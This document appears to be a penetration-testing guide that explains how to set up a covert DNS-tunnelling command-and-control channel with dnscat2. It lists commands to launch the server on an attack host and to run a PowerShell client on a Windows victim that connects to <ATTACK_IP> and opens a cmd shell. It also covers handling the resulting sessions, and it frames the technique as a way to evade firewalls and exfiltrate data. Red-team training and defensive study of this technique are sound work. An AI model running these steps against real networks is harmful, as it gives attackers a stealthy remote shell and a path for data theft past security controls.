### DNS Tunneling with Dnscat2

**DNS tunneling** is a technique that encapsulates data within the DNS protocol, specifically utilizing **TXT records** to establish an encrypted Command-and-Control (C2) channel.

#### Scenario Context

Use this technique to **evade firewall detections** that perform HTTPS inspection or traffic sniffing. In most corporate Active Directory environments, internal DNS servers are permitted to resolve hostnames via external DNS servers, providing a path for data exfiltration even when direct outbound web traffic is restricted.

---

#### 1. Server Setup (Attack Host)

The server must be configured to listen for incoming DNS resolution requests that carry the tunneled data.

**Operational Workflow:**

1. **Prepare the environment:** Clone the repository and install the necessary Ruby dependencies.
2. **Launch the listener:** Start the `dnscat2` server by defining the listening IP and the domain for which it will act as the authority.

|Command|Description|
|:--|:--|
|`git clone https://github.com/iagox86/dnscat2.git`|Clones the server source code.|
|`sudo gem install bundler && sudo bundle install`|Installs required Ruby gems.|
|`sudo ruby dnscat2.rb --dns host=<ATTACK_IP>,port=<PORT>,domain=<DOMAIN> --no-cache`|Starts the C2 server.|

**Key Decision Point:** Upon starting, the server generates a **pre-shared secret**. This secret is **mandatory** for the client to authenticate and ensure the session is encrypted.

---

#### 2. Client Deployment (Windows Target)

For Windows targets, `dnscat2-powershell` provides a compatible client to establish the tunnel.

**Operational Workflow:**

1. **Transfer the client:** Clone the PowerShell client to the attack host and transfer `dnscat2.ps1` to the victim.
2. **Import the module:** Load the script into the current PowerShell session.
3. **Establish the tunnel:** Execute the client, pointing it to the attack server using the **pre-shared secret** generated by the server.

| Command                                                                                     | Description                                      |
| :------------------------------------------------------------------------------------------ | :----------------------------------------------- |
| `Import-Module .\dnscat2.ps1`                                                               | Imports the client functions into PowerShell.    |
| `Start-Dnscat2 -DNSserver <ATTACK_IP> -Domain <DOMAIN> -PreSharedSecret <SECRET> -Exec cmd` | Establishes the tunnel and requests a CMD shell. |

---

#### 3. Session Management & Interaction

Once the client connects, the server creates a new window for the session.

**Operational Workflow:**

1. **Verify Connection:** Confirm the session is **ENCRYPTED AND VERIFIED** on the server console.
2. **Interact with Session:** Use the `window` command to hook into the specific session ID.
3. **Execute Commands:** Once attached, you are dropped into a console session where commands are sent directly to the client.

**Command Reference:**

|Command|Purpose|
|:--|:--|
|`?`|Lists available internal `dnscat2` commands.|
|`windows`|Lists all active client sessions.|
|`window -i <SESSION_ID>`|Interacts with a specific session (e.g., to access the shell).|
|`ctrl-z`|Backgrounds the current window to return to the main prompt.|

**Attack Implications:** Successfully establishing this tunnel unlocks a **stealthy shell** on the target. Because the traffic mimics standard DNS queries, it often bypasses traditional network security boundaries, allowing for persistent communication and further movement within the environment.
